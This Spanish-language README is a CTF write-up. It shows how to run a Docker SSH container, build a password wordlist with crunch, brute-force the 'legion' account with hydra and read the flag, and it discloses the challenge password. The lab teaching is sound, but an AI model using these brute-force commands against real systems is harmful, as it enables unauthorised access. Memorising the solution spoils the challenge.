# 🧪 Reto CTF Docker Hub – Usuario 'legion'

<p align="center">
  <img src="Imagenes/GRUPO URTG.png">
</p>

Este repositorio documenta paso a paso la resolución del reto CTF basado en un contenedor Docker que expone un servicio SSH con el usuario `legion`, cuya contraseña debe ser descubierta a partir de un acertijo.

---

## 🔹 PASO 1: Descargar la Imagen Docker

```bash
docker pull jaiderospina/retoctf:1.0
```

**Descripción:**
Descarga una imagen pública con Ubuntu y servicio SSH habilitado, preconfigurado con un usuario `legion`.

<img width="1500" height="400" alt="image" src="https://github.com/user-attachments/assets/43c48b01-01ad-4a80-abf1-864ddcf927f4" />

---

## 🔹 PASO 2: Levantar el Contenedor

```bash
docker run -d -p 2222:22 --name mi-contenedor-ssh jaiderospina/retoctf:1.0
```

**Explicación de parámetros:**
- `-d`: modo segundo plano (detached).
- `-p 2222:22`: expone el puerto 22 del contenedor en el 2222 del host.
- `--name`: nombre asignado al contenedor para fácil manejo.

**Objetivo:** Tener un contenedor activo con SSH disponible para conexión desde el host.
<img width="1500" height="400" alt="image" src="https://github.com/user-attachments/assets/82d37956-15fa-44d0-8355-ec4345fd5503" />

---

## 🔹 PASO 3: Generar Diccionario con `crunch`

### Opción A: Letras definidas

```bash
crunch 5 5 sdeg -t E%%%% -o lista.txt
```

### Opción B: Patrón libre con mayúsculas/minúsculas

```bash
crunch 5 5 -t E%%%% -o lista.txt -f /usr/share/crunch/charset.lst mixalpha
```

**Explicación:**
- `5 5`: longitud fija de 5 caracteres.
- `-t E%%%%`: patrón donde la primera letra es "E", las demás varían.
- `-o lista.txt`: salida al archivo.
- `-f ... mixalpha`: usa todas las letras mayúsculas y minúsculas.

**Objetivo:** Crear un diccionario de posibles contraseñas según pistas del acertijo del reto.
<img width="1500" height="400" alt="image" src="https://github.com/user-attachments/assets/eb8c4421-cb32-427d-92b6-27ca5f474eee" />

---

## 🔹 PASO 4: Ataque de Fuerza Bruta con `hydra`

```bash
hydra -l legion -P lista.txt ssh://localhost:2222
```

**Explicación:**
- `-l legion`: usuario a atacar.
- `-P lista.txt`: diccionario de contraseñas generado.
- `ssh://localhost:2222`: objetivo SSH en el contenedor.

**Resultado esperado:**
Hydra identifica la contraseña correcta e imprime una línea como:

```
[22][ssh] host: localhost   login: legion   password: Esdeo
```
<img width="1500" height="400" alt="image" src="https://github.com/user-attachments/assets/f9a5e395-0b7f-4a26-bd33-76af4b17bc37" />

---

## 🔹 PASO FINAL: Acceso al contenedor por SSH

```bash
ssh legion@localhost -p 2222
```

**Objetivo:**
Ingresar como el usuario `legion` al contenedor una vez descubierta la contraseña, para buscar la bandera (flag) del reto:

```bash
ls
cat flag.txt
```
<img width="1500" height="400" alt="image" src="https://github.com/user-attachments/assets/3543546d-49cc-450b-a452-926a6800e0fb" />

---

## ✅ Conclusión

Este reto CTF pone en práctica habilidades de:
- Manejo de contenedores Docker.
- Generación de diccionarios personalizados con `crunch`.
- Uso de herramientas de fuerza bruta como `hydra`.
- Análisis lógico de acertijos para deducir patrones de contraseñas.

> 💡 Ideal para estudiantes de ciberseguridad, testers o pentesters en formación.
